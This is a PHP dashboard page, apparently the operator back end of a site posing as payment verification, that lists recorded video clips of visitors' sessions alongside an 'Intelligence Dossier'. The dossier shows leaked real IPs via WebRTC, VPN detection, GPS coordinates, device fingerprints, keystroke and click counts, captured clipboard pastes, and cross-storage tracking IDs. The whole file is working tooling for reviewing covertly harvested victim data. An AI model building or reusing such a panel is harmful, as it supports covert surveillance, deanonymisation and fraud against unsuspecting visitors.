<?php
date_default_timezone_set("America/Los_Angeles");
define('BASE_URL', 'https://verify.payzuro.com/records/');
$base_dir = 'records';
// Minimum file size in bytes to count as a real clip (filters out empty/header-only recordings)
define('MIN_CLIP_SIZE', 1000);

function uniqid_to_timestamp($hex_name) {
    $hex8 = substr($hex_name, 0, 8);
    $ts = hexdec($hex8);
    if ($ts > 1577836800 && $ts < 1893456000) return $ts;
    return false;
}

function load_session_account($session_dir) {
    $meta_file = $session_dir . '/account.json';
    if (file_exists($meta_file)) {
        return json_decode(file_get_contents($meta_file), true);
    }
    return null;
}

function load_session_dossier($session_dir) {
    $dossier_file = $session_dir . '/dossier.json';
    if (file_exists($dossier_file)) {
        return json_decode(file_get_contents($dossier_file), true);
    }
    return null;
}

$current_dir = $base_dir;
if (isset($_GET['dir']) && is_dir($base_dir . '/' . $_GET['dir'])) {
    $current_dir = realpath($base_dir . '/' . $_GET['dir']);
    if (strpos($current_dir, realpath($base_dir)) !== 0) {
        $current_dir = $base_dir;
    }
}

$is_root = ($current_dir === $base_dir || $current_dir === realpath($base_dir));

$entries = [];
if ($handle = opendir($current_dir)) {
    while (false !== ($entry = readdir($handle))) {
        if ($entry != "." && $entry != ".." && $entry != "account.json" && $entry != "dossier.json") {
            $full_path = $current_dir . '/' . $entry;
            $relative_path = substr($full_path, strlen(realpath($base_dir)) + 1);
            $is_dir = is_dir($full_path);
            $size = $is_dir ? 0 : filesize($full_path);
            $mtime = filemtime($full_path);
            $decoded_ts = uniqid_to_timestamp(basename($entry, '.webm'));
            $entries[] = [
                'name'     => $entry,
                'full'     => $full_path,
                'relative' => $relative_path,
                'is_dir'   => $is_dir,
                'size'     => $size,
                'mtime'    => $mtime,
                'ts'       => $decoded_ts ?: $mtime,
            ];
        }
    }
    closedir($handle);
}

usort($entries, function($a, $b) { return $b['ts'] - $a['ts']; });

$clip_count = 0;
$clip_entries = [];
$account_info = null;
$dossier_info = null;
if (!$is_root) {
    $account_info = load_session_account($current_dir);
    $dossier_info = load_session_dossier($current_dir);
    foreach ($entries as $e) {
        if (!$e['is_dir'] && $e['size'] >= MIN_CLIP_SIZE) {
            $clip_count++;
            $clip_entries[] = $e;
        }
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Session Recordings</title>
<style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #0f1117; color: #e1e4e8; padding: 24px; }
    h1 { font-size: 1.5rem; margin-bottom: 6px; color: #fff; }
    h2 { font-size: 1.1rem; margin: 20px 0 10px; color: #fff; }
    .subtitle { color: #8b949e; margin-bottom: 4px; font-size: 0.9rem; }
    .account-badge { display: inline-block; background: #1f6feb33; color: #58a6ff; padding: 3px 10px; border-radius: 12px; font-size: 0.8rem; margin-bottom: 12px; }
    .vpn-badge { display: inline-block; background: #da363333; color: #f85149; padding: 3px 10px; border-radius: 12px; font-size: 0.8rem; margin-bottom: 12px; margin-left: 6px; }
    .returning-badge { display: inline-block; background: #f0883e33; color: #f0883e; padding: 3px 10px; border-radius: 12px; font-size: 0.8rem; margin-bottom: 12px; margin-left: 6px; }
    .gps-badge { display: inline-block; background: #23863633; color: #3fb950; padding: 3px 10px; border-radius: 12px; font-size: 0.8rem; margin-bottom: 12px; margin-left: 6px; }
    a { color: #58a6ff; text-decoration: none; }
    a:hover { text-decoration: underline; }
    .back { display: inline-block; margin-bottom: 16px; color: #8b949e; font-size: 0.9rem; }
    .back:hover { color: #58a6ff; }
    table { width: 100%; border-collapse: collapse; background: #161b22; border-radius: 8px; overflow: hidden; margin-top: 12px; }
    th { text-align: left; padding: 10px 14px; background: #1c2129; color: #8b949e; font-size: 0.8rem; text-transform: uppercase; letter-spacing: 0.5px; border-bottom: 1px solid #30363d; }
    td { padding: 10px 14px; border-bottom: 1px solid #21262d; font-size: 0.9rem; }
    tr:hover td { background: #1c2129; }
    .date { color: #8b949e; white-space: nowrap; }
    .size { color: #8b949e; white-space: nowrap; }
    .icon { margin-right: 6px; }
    .empty { padding: 40px; text-align: center; color: #484f58; }
    .actions { display: flex; gap: 10px; margin: 16px 0; flex-wrap: wrap; }
    .btn { display: inline-flex; align-items: center; gap: 6px; padding: 10px 18px; border-radius: 8px; font-size: 0.9rem; font-weight: 500; border: none; cursor: pointer; transition: background 0.2s; text-decoration: none; }
    .btn-primary { background: #238636; color: #fff; }
    .btn-primary:hover { background: #2ea043; text-decoration: none; }
    .btn-secondary { background: #21262d; color: #c9d1d9; border: 1px solid #30363d; }
    .btn-secondary:hover { background: #30363d; text-decoration: none; }
    .btn:disabled { opacity: 0.5; cursor: not-allowed; }
    .progress-bar { display: none; margin: 12px 0; background: #21262d; border-radius: 6px; overflow: hidden; height: 8px; }
    .progress-bar .fill { height: 100%; background: #58a6ff; transition: width 0.3s; width: 0%; }
    .status-msg { color: #8b949e; font-size: 0.85rem; margin: 8px 0; display: none; }
    .clip-count { display: inline-block; background: #30363d; color: #8b949e; padding: 2px 8px; border-radius: 10px; font-size: 0.75rem; margin-left: 6px; }
    .dl-icon { color: #8b949e; margin-left: 8px; font-size: 0.8rem; cursor: pointer; }
    .dl-icon:hover { color: #58a6ff; }

    /* Dossier panel */
    .dossier-panel { background: #161b22; border: 1px solid #30363d; border-radius: 10px; padding: 20px; margin: 16px 0; }
    .dossier-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 16px; }
    .dossier-card { background: #0d1117; border: 1px solid #21262d; border-radius: 8px; padding: 14px; }
    .dossier-card h3 { font-size: 0.85rem; color: #8b949e; text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 10px; }
    .dossier-row { display: flex; justify-content: space-between; padding: 4px 0; font-size: 0.85rem; border-bottom: 1px solid #161b22; }
    .dossier-row:last-child { border-bottom: none; }
    .dossier-label { color: #8b949e; }
    .dossier-value { color: #e1e4e8; text-align: right; max-width: 60%; word-break: break-all; }
    .dossier-value.highlight { color: #f85149; font-weight: 600; }
    .dossier-value.success { color: #3fb950; }
    .dossier-value.warning { color: #f0883e; }
    .dossier-section-title { font-size: 1rem; color: #fff; margin: 20px 0 12px; display: flex; align-items: center; gap: 8px; }
    .dossier-toggle { cursor: pointer; user-select: none; padding: 6px 12px; background: #21262d; border: 1px solid #30363d; border-radius: 6px; color: #c9d1d9; font-size: 0.85rem; }
    .dossier-toggle:hover { background: #30363d; }
    .dossier-raw { display: none; background: #0d1117; border: 1px solid #21262d; border-radius: 8px; padding: 14px; margin-top: 10px; font-family: 'SF Mono', Monaco, Consolas, monospace; font-size: 0.8rem; color: #8b949e; white-space: pre-wrap; word-break: break-all; max-height: 500px; overflow-y: auto; }

    /* Session list intel badges */
    .intel-badges { display: flex; gap: 4px; flex-wrap: wrap; margin-top: 4px; }
    .intel-badge { display: inline-block; padding: 1px 6px; border-radius: 8px; font-size: 0.7rem; }
    .intel-badge.gps { background: #23863622; color: #3fb950; }
    .intel-badge.vpn { background: #da363322; color: #f85149; }
    .intel-badge.webrtc { background: #1f6feb22; color: #58a6ff; }
    .intel-badge.returning { background: #f0883e22; color: #f0883e; }
    .intel-badge.fingerprint { background: #8b949e22; color: #8b949e; }
</style>
</head>
<body>

<?php if ($is_root): ?>
    <h1>📹 Session Recordings</h1>
    <p class="subtitle"><?php echo count($entries); ?> sessions — sorted newest first</p>
<?php else: ?>
    <a class="back" href="explore.php">← Back to all sessions</a>
    <h1>📁 Session <?php echo htmlspecialchars(basename($current_dir)); ?></h1>
    <?php
    $dir_ts = uniqid_to_timestamp(basename($current_dir));
    if ($dir_ts) echo '<p class="subtitle">Started: ' . date('M j, Y \a\t g:i A', $dir_ts) . ' PT</p>';
    echo '<p class="subtitle">' . $clip_count . ' video clips</p>';
    if ($account_info) echo '<span class="account-badge">👤 ' . htmlspecialchars($account_info['email'] ?? 'Unknown') . '</span>';
    
    // Dossier badges
    if ($dossier_info) {
        if (!empty($dossier_info['server']['likely_vpn'])) {
            echo '<span class="vpn-badge">🛡 VPN Detected</span>';
        }
        if (!empty($dossier_info['persistence']['is_returning'])) {
            echo '<span class="returning-badge">🔄 Returning Visitor</span>';
        }
        if (!empty($dossier_info['location']['latitude'])) {
            echo '<span class="gps-badge">📍 GPS Captured</span>';
        }
    }
    ?>
    
    <?php if ($clip_count > 0): ?>
    <div class="actions">
        <a href="download.php?dir=<?php echo urlencode(basename($current_dir)); ?>" class="btn btn-primary">
            📦 Download All (ZIP)
        </a>
        <button id="combineBtn" class="btn btn-secondary" onclick="combineVideos()">
            🎬 Combine & Download
        </button>
        <?php if ($dossier_info): ?>
        <a href="records/<?php echo urlencode(basename($current_dir)); ?>/dossier.json" class="btn btn-secondary" target="_blank">
            📋 Raw Dossier JSON
        </a>
        <?php endif; ?>
    </div>
    <div class="progress-bar" id="progressBar"><div class="fill" id="progressFill"></div></div>
    <div class="status-msg" id="statusMsg"></div>
    <?php endif; ?>
    
    <?php // ── DOSSIER PANEL ── ?>
    <?php if ($dossier_info): ?>
    <div class="dossier-panel">
        <div class="dossier-section-title">🕵️ Intelligence Dossier</div>
        <div class="dossier-grid">
            
            <!-- Network & IP -->
            <div class="dossier-card">
                <h3>🌐 Network & IP</h3>
                <div class="dossier-row">
                    <span class="dossier-label">Server IP</span>
                    <span class="dossier-value"><?php echo htmlspecialchars($dossier_info['server']['server_ip'] ?? 'N/A'); ?></span>
                </div>
                <?php if (!empty($dossier_info['network']['webrtc_ips'])): ?>
                <div class="dossier-row">
                    <span class="dossier-label">WebRTC IPs</span>
                    <span class="dossier-value <?php echo count($dossier_info['network']['webrtc_ips']) > 1 ? 'highlight' : 'success'; ?>">
                        <?php echo htmlspecialchars(implode(', ', $dossier_info['network']['webrtc_ips'])); ?>
                    </span>
                </div>
                <?php endif; ?>
                <?php if (!empty($dossier_info['server']['real_ip_candidates'])): ?>
                <div class="dossier-row">
                    <span class="dossier-label">Real IP (leaked)</span>
                    <span class="dossier-value highlight"><?php echo htmlspecialchars(implode(', ', $dossier_info['server']['real_ip_candidates'])); ?></span>
                </div>
                <?php endif; ?>
                <?php if (!empty($dossier_info['server']['reverse_dns'])): ?>
                <div class="dossier-row">
                    <span class="dossier-label">Reverse DNS</span>
                    <span class="dossier-value"><?php echo htmlspecialchars($dossier_info['server']['reverse_dns']); ?></span>
                </div>
                <?php endif; ?>
                <?php if (!empty($dossier_info['server']['likely_vpn'])): ?>
                <div class="dossier-row">
                    <span class="dossier-label">VPN Status</span>
                    <span class="dossier-value highlight">⚠ LIKELY VPN</span>
                </div>
                <?php endif; ?>
                <?php if (!empty($dossier_info['server']['vpn_indicators'])): ?>
                <?php foreach ($dossier_info['server']['vpn_indicators'] as $ind): ?>
                <div class="dossier-row">
                    <span class="dossier-label">VPN Signal</span>
                    <span class="dossier-value warning"><?php echo htmlspecialchars($ind); ?></span>
                </div>
                <?php endforeach; ?>
                <?php endif; ?>
                <div class="dossier-row">
                    <span class="dossier-label">Referrer</span>
                    <span class="dossier-value"><?php echo htmlspecialchars($dossier_info['network']['referrer'] ?? 'direct'); ?></span>
                </div>
            </div>
            
            <!-- GPS Location -->
            <div class="dossier-card">
                <h3>📍 Location</h3>
                <?php if (!empty($dossier_info['location']['latitude'])): ?>
                <div class="dossier-row">
                    <span class="dossier-label">Coordinates</span>
                    <span class="dossier-value success">
                        <?php echo round($dossier_info['location']['latitude'], 6) . ', ' . round($dossier_info['location']['longitude'], 6); ?>
                    </span>
                </div>
                <div class="dossier-row">
                    <span class="dossier-label">Accuracy</span>
                    <span class="dossier-value"><?php echo round($dossier_info['location']['accuracy_meters'] ?? 0); ?>m</span>
                </div>
                <div class="dossier-row">
                    <span class="dossier-label">Google Maps</span>
                    <span class="dossier-value">
                        <a href="https://www.google.com/maps?q=<?php echo $dossier_info['location']['latitude']; ?>,<?php echo $dossier_info['location']['longitude']; ?>" target="_blank">Open ↗</a>
                    </span>
                </div>
                <?php if (!empty($dossier_info['location']['altitude'])): ?>
                <div class="dossier-row">
                    <span class="dossier-label">Altitude</span>
                    <span class="dossier-value"><?php echo round($dossier_info['location']['altitude']); ?>m</span>
                </div>
                <?php endif; ?>
                <?php else: ?>
                <div class="dossier-row">
                    <span class="dossier-label">GPS Status</span>
                    <span class="dossier-value warning"><?php echo htmlspecialchars($dossier_info['location']['gps_error'] ?? 'Not captured'); ?></span>
                </div>
                <?php endif; ?>
                <div class="dossier-row">
                    <span class="dossier-label">Timezone</span>
                    <span class="dossier-value"><?php echo htmlspecialchars($dossier_info['device']['timezone'] ?? 'N/A'); ?></span>
                </div>
                <div class="dossier-row">
                    <span class="dossier-label">Language</span>
                    <span class="dossier-value"><?php echo htmlspecialchars($dossier_info['device']['language'] ?? 'N/A'); ?></span>
                </div>
            </div>
            
            <!-- Device Fingerprint -->
            <div class="dossier-card">
                <h3>🖥 Device Fingerprint</h3>
                <div class="dossier-row">
                    <span class="dossier-label">Composite Hash</span>
                    <span class="dossier-value" style="font-family: monospace;"><?php echo htmlspecialchars($dossier_info['fingerprint']['composite_hash'] ?? 'N/A'); ?></span>
                </div>
                <div class="dossier-row">
                    <span class="dossier-label">Canvas Hash</span>
                    <span class="dossier-value" style="font-family: monospace;"><?php echo htmlspecialchars($dossier_info['fingerprint']['canvas_hash'] ?? 'N/A'); ?></span>
                </div>
                <div class="dossier-row">
                    <span class="dossier-label">Audio Hash</span>
                    <span class="dossier-value" style="font-family: monospace;"><?php echo htmlspecialchars(substr($dossier_info['fingerprint']['audio_hash'] ?? 'N/A', 0, 20)); ?></span>
                </div>
                <div class="dossier-row">
                    <span class="dossier-label">GPU</span>
                    <span class="dossier-value"><?php echo htmlspecialchars($dossier_info['fingerprint']['webgl_renderer'] ?? 'N/A'); ?></span>
                </div>
                <div class="dossier-row">
                    <span class="dossier-label">GPU Vendor</span>
                    <span class="dossier-value"><?php echo htmlspecialchars($dossier_info['fingerprint']['webgl_vendor'] ?? 'N/A'); ?></span>
                </div>
                <div class="dossier-row">
                    <span class="dossier-label">Fonts Detected</span>
                    <span class="dossier-value"><?php echo $dossier_info['fingerprint']['font_count'] ?? 'N/A'; ?></span>
                </div>
            </div>
            
            <!-- Device Details -->
            <div class="dossier-card">
                <h3>📱 Device Details</h3>
                <div class="dossier-row">
                    <span class="dossier-label">Platform</span>
                    <span class="dossier-value"><?php echo htmlspecialchars($dossier_info['device']['platform'] ?? 'N/A'); ?></span>
                </div>
                <div class="dossier-row">
                    <span class="dossier-label">Screen</span>
                    <span class="dossier-value"><?php echo ($dossier_info['device']['screen_width'] ?? '?') . '×' . ($dossier_info['device']['screen_height'] ?? '?'); ?></span>
                </div>
                <div class="dossier-row">
                    <span class="dossier-label">Pixel Ratio</span>
                    <span class="dossier-value"><?php echo $dossier_info['device']['pixel_ratio'] ?? 'N/A'; ?>x</span>
                </div>
                <div class="dossier-row">
                    <span class="dossier-label">CPU Cores</span>
                    <span class="dossier-value"><?php echo $dossier_info['device']['cpu_cores'] ?? 'N/A'; ?></span>
                </div>
                <div class="dossier-row">
                    <span class="dossier-label">RAM</span>
                    <span class="dossier-value"><?php echo ($dossier_info['device']['device_memory_gb'] ?? 'N/A') . ' GB'; ?></span>
                </div>
                <div class="dossier-row">
                    <span class="dossier-label">Touch Points</span>
                    <span class="dossier-value"><?php echo $dossier_info['device']['max_touch_points'] ?? '0'; ?></span>
                </div>
                <div class="dossier-row">
                    <span class="dossier-label">Cameras</span>
                    <span class="dossier-value"><?php echo $dossier_info['device']['camera_count'] ?? 'N/A'; ?></span>
                </div>
                <div class="dossier-row">
                    <span class="dossier-label">Connection</span>
                    <span class="dossier-value"><?php echo htmlspecialchars($dossier_info['device']['connection_type'] ?? 'N/A'); ?></span>
                </div>
                <?php if (isset($dossier_info['device']['battery_level'])): ?>
                <div class="dossier-row">
                    <span class="dossier-label">Battery</span>
                    <span class="dossier-value"><?php echo round($dossier_info['device']['battery_level'] * 100); ?>% <?php echo $dossier_info['device']['battery_charging'] ? '⚡' : ''; ?></span>
                </div>
                <?php endif; ?>
                <div class="dossier-row">
                    <span class="dossier-label">Webdriver</span>
                    <span class="dossier-value <?php echo !empty($dossier_info['device']['webdriver']) ? 'highlight' : ''; ?>">
                        <?php echo !empty($dossier_info['device']['webdriver']) ? '⚠ YES (bot)' : 'No'; ?>
                    </span>
                </div>
            </div>
            
            <!-- Persistence / Tracking -->
            <div class="dossier-card">
                <h3>🔗 Tracking & Persistence</h3>
                <div class="dossier-row">
                    <span class="dossier-label">Tracking ID</span>
                    <span class="dossier-value" style="font-family: monospace; font-size: 0.75rem;"><?php echo htmlspecialchars($dossier_info['persistence']['tracking_id'] ?? 'N/A'); ?></span>
                </div>
                <div class="dossier-row">
                    <span class="dossier-label">Returning Visitor</span>
                    <span class="dossier-value <?php echo !empty($dossier_info['persistence']['is_returning']) ? 'warning' : ''; ?>">
                        <?php echo !empty($dossier_info['persistence']['is_returning']) ? '🔄 YES' : 'No (first visit)'; ?>
                    </span>
                </div>
                <?php if (!empty($dossier_info['persistence']['sources_recovered'])): ?>
                <div class="dossier-row">
                    <span class="dossier-label">Recovered From</span>
                    <span class="dossier-value"><?php echo htmlspecialchars(implode(', ', $dossier_info['persistence']['sources_recovered'])); ?></span>
                </div>
                <?php endif; ?>
                <div class="dossier-row">
                    <span class="dossier-label">Updates</span>
                    <span class="dossier-value"><?php echo $dossier_info['update_count'] ?? 1; ?> collection(s)</span>
                </div>
                <div class="dossier-row">
                    <span class="dossier-label">First Seen</span>
                    <span class="dossier-value"><?php echo htmlspecialchars($dossier_info['first_seen'] ?? 'N/A'); ?></span>
                </div>
                <div class="dossier-row">
                    <span class="dossier-label">Last Updated</span>
                    <span class="dossier-value"><?php echo htmlspecialchars($dossier_info['last_updated'] ?? 'N/A'); ?></span>
                </div>
            </div>
            
            <!-- Behavioral -->
            <div class="dossier-card">
                <h3>🧠 Behavioral Biometrics</h3>
                <div class="dossier-row">
                    <span class="dossier-label">Session Duration</span>
                    <span class="dossier-value"><?php 
                        $ms = $dossier_info['behavior']['session_duration_ms'] ?? 0;
                        echo $ms > 0 ? round($ms / 1000) . 's' : 'N/A';
                    ?></span>
                </div>
                <div class="dossier-row">
                    <span class="dossier-label">Mouse Events</span>
                    <span class="dossier-value"><?php echo $dossier_info['behavior']['total_mouse_events'] ?? 0; ?></span>
                </div>
                <div class="dossier-row">
                    <span class="dossier-label">Clicks</span>
                    <span class="dossier-value"><?php echo count($dossier_info['behavior']['clicks'] ?? []); ?></span>
                </div>
                <div class="dossier-row">
                    <span class="dossier-label">Keystrokes</span>
                    <span class="dossier-value"><?php echo count($dossier_info['behavior']['key_timing'] ?? []); ?></span>
                </div>
                <div class="dossier-row">
                    <span class="dossier-label">Touch Events</span>
                    <span class="dossier-value"><?php echo count($dossier_info['behavior']['touch_events'] ?? []); ?></span>
                </div>
                <?php if (!empty($dossier_info['behavior']['clipboard'])): ?>
                <div class="dossier-row">
                    <span class="dossier-label">Clipboard Pastes</span>
                    <span class="dossier-value highlight"><?php echo count($dossier_info['behavior']['clipboard']); ?> captured</span>
                </div>
                <?php endif; ?>
            </div>
        </div>
        
        <!-- User Agent (full width) -->
        <div class="dossier-card" style="margin-top: 16px;">
            <h3>🔍 User Agent</h3>
            <div style="font-size: 0.8rem; color: #8b949e; word-break: break-all; font-family: monospace;">
                <?php echo htmlspecialchars($dossier_info['device']['user_agent'] ?? 'N/A'); ?>
            </div>
        </div>
        
        <!-- Raw JSON toggle -->
        <div style="margin-top: 16px;">
            <span class="dossier-toggle" onclick="var el = document.getElementById('rawDossier'); el.style.display = el.style.display === 'none' ? 'block' : 'none'; this.textContent = el.style.display === 'none' ? '📄 Show Raw Dossier' : '📄 Hide Raw Dossier';">📄 Show Raw Dossier</span>
            <div id="rawDossier" class="dossier-raw"><?php echo htmlspecialchars(json_encode($dossier_info, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE)); ?></div>
        </div>
    </div>
    <?php endif; ?>
    
<?php endif; ?>

<?php if (empty($entries) && $is_root): ?>
    <div class="empty">No recordings found.</div>
<?php else: ?>
<table>
<thead>
<tr>
    <th>Name</th>
    <th>Date</th>
    <?php if (!$is_root): ?><th>Size</th><th></th><?php endif; ?>
</tr>
</thead>
<tbody>
<?php foreach ($entries as $e): ?>
    <?php
    // Skip empty / header-only clips (< 1 KB)
    if (!$e['is_dir'] && $e['size'] < MIN_CLIP_SIZE) continue;

    $display_date = $e['ts'] ? date('M j, Y g:i A', $e['ts']) : '';

    if ($e['is_dir']) {
        $decoded = uniqid_to_timestamp($e['name']);
        $date_label = $decoded ? date('M j, Y', $decoded) : '';
        $display_name = $e['name'];
        if ($date_label) $display_name .= ' (' . $date_label . ')';
        $sess_account = load_session_account(realpath($base_dir) . '/' . $e['name']);
        $sess_dossier = load_session_dossier(realpath($base_dir) . '/' . $e['name']);
        $account_label = $sess_account ? ' — ' . htmlspecialchars($sess_account['email'] ?? '') : '';
        // Count real clips in this session (>= MIN_CLIP_SIZE)
        $sess_clips = 0;
        $sess_path = realpath($base_dir) . '/' . $e['name'];
        if ($dh = @opendir($sess_path)) {
            while (($f = readdir($dh)) !== false) {
                if ($f !== '.' && $f !== '..' && $f !== 'account.json' && $f !== 'dossier.json' && is_file($sess_path.'/'.$f) && filesize($sess_path.'/'.$f) >= MIN_CLIP_SIZE) $sess_clips++;
            }
            closedir($dh);
        }
    ?>
    <tr>
        <td>
            <span class="icon">📂</span><a href="?dir=<?php echo urlencode($e['relative']); ?>"><?php echo htmlspecialchars($display_name); ?></a>
            <span class="clip-count"><?php echo $sess_clips; ?> clips</span>
            <?php if ($account_label): ?>
                <span class="account-badge">👤<?php echo $account_label; ?></span>
            <?php endif; ?>
            <?php if ($sess_dossier): ?>
            <div class="intel-badges">
                <?php if (!empty($sess_dossier['fingerprint']['composite_hash'])): ?>
                    <span class="intel-badge fingerprint">🔑 <?php echo htmlspecialchars(substr($sess_dossier['fingerprint']['composite_hash'], 0, 8)); ?></span>
                <?php endif; ?>
                <?php if (!empty($sess_dossier['location']['latitude'])): ?>
                    <span class="intel-badge gps">📍 GPS</span>
                <?php endif; ?>
                <?php if (!empty($sess_dossier['network']['webrtc_ips'])): ?>
                    <span class="intel-badge webrtc">🌐 WebRTC <?php echo count($sess_dossier['network']['webrtc_ips']); ?> IPs</span>
                <?php endif; ?>
                <?php if (!empty($sess_dossier['server']['likely_vpn'])): ?>
                    <span class="intel-badge vpn">🛡 VPN</span>
                <?php endif; ?>
                <?php if (!empty($sess_dossier['persistence']['is_returning'])): ?>
                    <span class="intel-badge returning">🔄 Returning</span>
                <?php endif; ?>
            </div>
            <?php endif; ?>
        </td>
        <td class="date"><?php echo $display_date; ?></td>
    </tr>
    <?php } else { ?>
    <?php
        $ext = pathinfo($e['name'], PATHINFO_EXTENSION);
        $base_name = pathinfo($e['name'], PATHINFO_FILENAME);
        $file_date = $e['ts'] ? date('Y-m-d_H-i-s', $e['ts']) : '';
        $display_filename = $file_date ? $file_date . '_' . $base_name . '.' . $ext : $e['name'];
        $filename = basename($e['relative']);
        $last_directory = basename(dirname($e['relative']));
        $file_url = BASE_URL . $last_directory . '/' . $filename;
        $size_kb = round($e['size'] / 1024);
        $size_display = $size_kb > 1024 ? round($size_kb / 1024, 1) . ' MB' : $size_kb . ' KB';
    ?>
    <tr>
        <td><span class="icon">🎬</span><a href="<?php echo $file_url; ?>" target="_blank"><?php echo htmlspecialchars($display_filename); ?></a></td>
        <td class="date"><?php echo $display_date; ?></td>
        <td class="size"><?php echo $size_display; ?></td>
        <td><a href="<?php echo $file_url; ?>" download="<?php echo htmlspecialchars($display_filename); ?>" class="dl-icon" title="Download clip">⬇</a></td>
    </tr>
    <?php } ?>
<?php endforeach; ?>
</tbody>
</table>
<?php endif; ?>

<?php if (!$is_root && $clip_count > 0): ?>
<script>
const clipUrls = [
<?php
    usort($clip_entries, function($a, $b) { return $a['ts'] - $b['ts']; });
    foreach ($clip_entries as $ce) {
        $fn = basename($ce['relative']);
        $dir_name = basename(dirname($ce['relative']));
        $url = 'https://verify.payzuro.com/records/' . $dir_name . '/' . $fn;
        echo "  " . json_encode($url) . ",\n";
    }
?>
];
const sessionId = <?php echo json_encode(basename($current_dir)); ?>;

function showStatus(msg) {
    const el = document.getElementById('statusMsg');
    el.textContent = msg;
    el.style.display = 'block';
}
function setProgress(pct) {
    document.getElementById('progressBar').style.display = 'block';
    document.getElementById('progressFill').style.width = pct + '%';
}

async function combineVideos() {
    const btn = document.getElementById('combineBtn');
    btn.disabled = true;
    btn.textContent = '⏳ Combining...';

    try {
        showStatus('Downloading clips...');
        const buffers = [];
        for (let i = 0; i < clipUrls.length; i++) {
            setProgress(Math.round((i / clipUrls.length) * 60));
            showStatus(`Downloading clip ${i + 1} of ${clipUrls.length}...`);
            try {
                const resp = await fetch(clipUrls[i]);
                if (!resp.ok) { console.warn(`Skip clip ${i+1}: HTTP ${resp.status}`); continue; }
                const buf = await resp.arrayBuffer();
                if (buf.byteLength >= 1000) buffers.push(buf);
            } catch (fetchErr) {
                console.warn(`Skip clip ${i+1}: fetch error`, fetchErr);
            }
        }

        if (buffers.length === 0) { showStatus('❌ No valid clips to combine.'); return; }

        setProgress(65);
        showStatus(`Combining ${buffers.length} clips...`);

        const sortedBySize = [...buffers].sort((a, b) => b.byteLength - a.byteLength);
        const metaBlob = new Blob([sortedBySize[0]], { type: 'video/webm' });

        const mimeTypes = [
            'video/webm;codecs=vp8,opus', 'video/webm;codecs=vp8',
            'video/webm;codecs=vp9,opus', 'video/webm;codecs=vp9', 'video/webm',
        ];
        let recorderMime = 'video/webm';
        for (const mt of mimeTypes) {
            if (MediaRecorder.isTypeSupported(mt)) { recorderMime = mt; break; }
        }

        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');

        const metaVideo = document.createElement('video');
        metaVideo.muted = true;
        metaVideo.playsInline = true;
        metaVideo.src = URL.createObjectURL(metaBlob);
        await new Promise((resolve, reject) => {
            metaVideo.onloadedmetadata = resolve;
            metaVideo.onerror = () => reject(new Error('Cannot read video metadata'));
            setTimeout(() => reject(new Error('Metadata timeout')), 10000);
        });
        canvas.width = metaVideo.videoWidth || 640;
        canvas.height = metaVideo.videoHeight || 480;
        URL.revokeObjectURL(metaVideo.src);

        const canvasStream = canvas.captureStream(30);
        const recorder = new MediaRecorder(canvasStream, { mimeType: recorderMime, videoBitsPerSecond: 2500000 });
        const chunks = [];
        recorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
        recorder.start(500);

        let clipsEncoded = 0;
        for (let i = 0; i < buffers.length; i++) {
            setProgress(65 + Math.round((i / buffers.length) * 30));
            showStatus(`Encoding clip ${i + 1} of ${buffers.length}...`);

            const blob = new Blob([buffers[i]], { type: 'video/webm' });
            const url = URL.createObjectURL(blob);
            const vid = document.createElement('video');
            vid.muted = true; vid.playsInline = true; vid.src = url;

            try {
                const loaded = await new Promise((resolve) => {
                    vid.onloadeddata = () => resolve(true);
                    vid.onerror = () => resolve(false);
                    setTimeout(() => resolve(false), 5000);
                });

                if (!loaded) { URL.revokeObjectURL(url); continue; }
                await vid.play().catch(() => {});

                await new Promise(resolve => {
                    function drawFrame() {
                        if (!vid.paused && !vid.ended) {
                            ctx.drawImage(vid, 0, 0, canvas.width, canvas.height);
                            requestAnimationFrame(drawFrame);
                        } else { resolve(); }
                    }
                    vid.onended = resolve; vid.onerror = resolve;
                    setTimeout(resolve, 30000);
                    drawFrame();
                });
                clipsEncoded++;
            } catch (e) { console.warn(`Clip ${i+1} skipped:`, e); }
            vid.src = ''; URL.revokeObjectURL(url);
        }

        if (clipsEncoded === 0) {
            recorder.stop();
            showStatus('❌ No clips could be encoded. Try "Download All (ZIP)" instead.');
            return;
        }

        recorder.stop();
        await new Promise(resolve => { recorder.onstop = resolve; });

        setProgress(100);
        showStatus('Preparing download...');

        const combined = new Blob(chunks, { type: 'video/webm' });
        const dlUrl = URL.createObjectURL(combined);
        const a = document.createElement('a');
        a.href = dlUrl; a.download = `session_${sessionId}_combined.webm`;
        document.body.appendChild(a); a.click(); document.body.removeChild(a);
        setTimeout(() => URL.revokeObjectURL(dlUrl), 1000);

        const sizeMB = (combined.size / 1024 / 1024).toFixed(1);
        showStatus(`✅ Combined video downloaded! (${sizeMB} MB, ${clipsEncoded} clips)`);
    } catch (err) {
        showStatus('❌ Error: ' + err.message + '. Try "Download All (ZIP)" instead.');
        console.error(err);
    } finally {
        btn.disabled = false;
        btn.textContent = '🎬 Combine & Download';
    }
}
</script>
<?php endif; ?>

</body>
</html>
